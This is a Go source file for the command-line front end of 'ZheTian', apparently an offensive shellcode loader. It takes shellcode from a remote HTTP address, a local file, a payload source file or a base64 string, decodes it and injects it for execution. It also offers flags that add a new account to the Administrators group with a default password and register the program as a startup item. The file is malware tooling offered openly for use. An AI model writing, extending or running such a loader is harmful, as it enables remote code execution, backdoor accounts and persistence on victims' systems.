package server

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/spf13/cobra"
	"os"
)

var (
	Uri           string //远程资源路径
	FilePath      string //本地资源路径
	Resource      string //源文件
	ShellCodeByte []byte //shellcode二进制
	UserName      string //用户名
	PassWD        string //密码
	StartMenu     bool   //是否添加启动项
	CommLine      string //直接在命令行输入shellcode
	rootCmd       = &cobra.Command{
		Use:   "ZheTian",
		Short: "http://github.com/yqcs/ZheTian",
		RunE: func(cmd *cobra.Command, args []string) error {
			err := startService()
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			return nil
		},
	}
)

//初始化
func init() {
	rootCmd.PersistentFlags().StringVarP(&Uri, "Uri", "u", "", "HTTP service address hosting shellCode byte file")
	rootCmd.PersistentFlags().StringVarP(&FilePath, "FilePath", "r", "", "Read from local byte file")
	rootCmd.PersistentFlags().BoolVarP(&StartMenu, "Open", "o", false, "Add to startup item")
	rootCmd.PersistentFlags().StringVarP(&UserName, "UserName", "n", "", "Add user to Administrators group.The default password is ZheTian@123 (Execute with administrator permissions)")
	rootCmd.PersistentFlags().StringVarP(&PassWD, "PassWD", "p", "", "User Password. Must use -n param")
	rootCmd.PersistentFlags().StringVarP(&Resource, "Payload Resource", "s", "", "Read payload source file,Supported lang:java、C、python、ruby、c#、perl、ruby...")
	rootCmd.PersistentFlags().StringVarP(&CommLine, "Command line input ShellCode", "c", "", "Enter the base64 string into the command line")

}

//Execute 挂载cli，等待执行
func Execute() {
	if len(os.Args) == 1 {
		fmt.Println("\nRun command: ZheTian -h")
		os.Exit(0)
	}
	if err := rootCmd.Execute(); err != nil {
		panic(err.Error())
	}
}

//shellcode格式：
//java类型需去除0x
//c or python 类型需去除\x
//示例：fc4883e4f0e8c8000000415141
func startService() error {

	//只能输入一个。就算输入多个也不会全部执行
	if Uri != "" {
		UriModel()
	} else if FilePath != "" {
		ReadFileModel()
	} else if Resource != "" {
		ResourceModel()
	} else if CommLine != "" {
		CommLineModel()
	}
	if UserName != "" {
		if len(UserName) <= 6 || len(PassWD) <= 6 {
			fmt.Println("账户名与密码的长度需大于6位")
			os.Exit(1)
		}
		if err := NetUserAdd(UserInfo{
			UserName, PassWD,
		}); err != nil {
			fmt.Println(err.Error())
		}
	}
	if StartMenu {
		StartUp()
	}
	decodeBytes, err := base64.StdEncoding.DecodeString(string(ShellCodeByte))
	if err != nil {
		return errors.New(err.Error())
	}

	//最后执行该行
	shellCode, err := hex.DecodeString(string(decodeBytes))
	if err == nil {
		Inject(shellCode)
	}
	return errors.New(err.Error())
}
